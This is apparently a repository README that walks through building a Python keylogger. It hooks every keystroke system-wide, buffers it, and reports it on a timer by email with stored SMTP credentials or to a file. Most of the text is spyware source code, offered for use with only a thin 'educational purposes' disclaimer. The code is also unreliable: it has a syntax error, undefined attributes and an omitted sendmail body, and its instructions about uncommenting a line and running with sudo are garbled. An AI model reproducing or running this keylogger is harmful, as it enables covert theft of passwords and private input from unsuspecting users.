# Keylogger Step by Step  Walkthrough

Welcome to the Keylogger Walkthrough repository! This guide is designed to provide cybersecurity enthusiasts with the knowledge to create, analyze, and understand keyloggers. It is intended for educational purposes only.

Before diving into keylogger creation, it’s crucial to set up a proper environment. The guide suggests using a virtual environment (venv) to avoid dependency issues. It walks through the process of creating a folder for the keylogger, activating the virtual environment, and installing the keyboard module with pip install keyboard.


## What is keyboard module in python? 

Python offers a plethora of modules that extend its capabilities, and one such module is the keyboard module. This module is instrumental in creating keyloggers, tools designed to record keystrokes on a computer’s keyboard. While keyloggers can serve legitimate purposes like monitoring employee productivity or parental control, they also pose significant security risks if misused by malicious entities.
It's essential to note that while keyloggers have legitimate uses like monitoring employee productivity or parental control, they can be misused by hackers to capture sensitive information.

First, create a folder on your local system,

<pre>
mkdir keylogger
</pre>

Next, we would cd into the keylogger directory and create a virtual environment python -m venv myenv. Then, activate the Virtual environment source myenv/bin/activate, and then we can install dependencies.

<pre>
cd keylogger
python -m venv myenv
</pre>

## Prerequisites
Before we begin, you'll need to install the **keyboard** module. Open your terminal or command prompt and enter:

<pre>
$ pip install keyboard
</pre>

This module allows us to take control of the keyboard, hook global events, register hotkeys, simulate key presses, and more.

## Disclaimer

This guide should not be used for illegal purposes. The aim is to raise awareness about the capabilities and risks associated with keyloggers.

## Getting Started

This guide will walk you through setting up a basic keylogger using Python. You'll learn how to capture keystrokes and how to handle the data collected.

- Continuous keystroke monitoring
- Customizable report methods (email or local storage)
- Easy-to-follow Python scripts

# Setting Up the Keylogger

Let's initialize the required parameters:
<pre>

    import keyboard
    import smtplib
    from threading import Timer
    from datetime import datetime
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
</pre>

Replace **your_email@example.com** and **your_email_password** with your actual email credentials.

Now, we'll create a class to represent the keylogger:

<pre>
   class Keylogger:
        def __init__(self, interval, report_method="email"):
            self.interval = interval
            self.report_method = report_method
            self.log = ""
            self.start_dt = datetime.now()
            self.end_dt = datetime.now()
</pre>

The **interval** parameter represents the reporting frequency, and **report_method** specifies whether to send logs via email or save them to a local file.

## Listening to Keystrokes

We'll utilize the **keyboard** module's **on_release()** function to capture keystrokes:

<pre>
     def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            elif name == "backspace"
                name = ""
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
</pre>

This callback function is invoked whenever a key is released. It transforms special keys and adds them to the global **self.log** variable.

## Reporting Keystrokes

Depending on the chosen **report_method**, we can report the keystrokes either via email or save them to a local file:

<pre>
     def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message, verbose=1):
        # SMTP server connection and email sending logic
        # ...
</pre>

## Scheduling Reports

To ensure periodic reporting, we'll use a timer:
<pre>
    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
  </pre>
  
This method is called at regular intervals (**self.interval**) to report the accumulated keystrokes.

## Starting the Keylogger

Finally, we initiate the keylogger with the following code:

<pre>
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()
  </pre>
  
This **start()** method records the start time, sets up the keylogger, and waits for the user to press CTRL+C to exit the program.

## Putting It All Together

Now, let's instantiate the **Keylogger** class and start the keylogger:

<pre>
    if __name__ == "__main__":
        keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
        keylogger.start()
</pre>

Uncomment the line with **report_method="email"** if you prefer to receive reports via email.

To get it started, run sudo python nameoffile.py. If you run this without side you will get an error.

## Contribution

Contributions are welcome! If you have any suggestions or improvements, please feel free to fork the repository and submit a pull request.

## Acknowledgments

- All contributors who have helped with this guide
- The cybersecurity community for their continuous support

Thank you for visiting the Keylogger-Guide repository!


